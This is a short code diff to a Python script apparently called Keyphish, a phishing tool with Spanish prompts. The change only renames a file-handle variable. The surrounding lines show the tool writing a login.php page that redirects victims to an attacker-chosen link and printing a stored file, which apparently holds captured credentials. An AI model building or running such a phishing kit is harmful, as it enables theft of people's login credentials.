@@ -63,7 +63,7 @@ def contra():
         print(archiv.read())
 
 def link():
-    escribir= open('login.php', 'w')
+    archivo= open('login.php', 'w')
 
     y=input('Inserte un link para redireccionar.\n     1- Atrás\nKeyphish:~$ ')
 
@@ -78,8 +78,8 @@ def link():
     exit();
     ?>''')
 
-    escribir.write(r)
-    escribir.close()
+    archivo.write(r)
+    archivo.close()
     if y==1:
         clearConsole()
         os.system("python Keyphish.py")
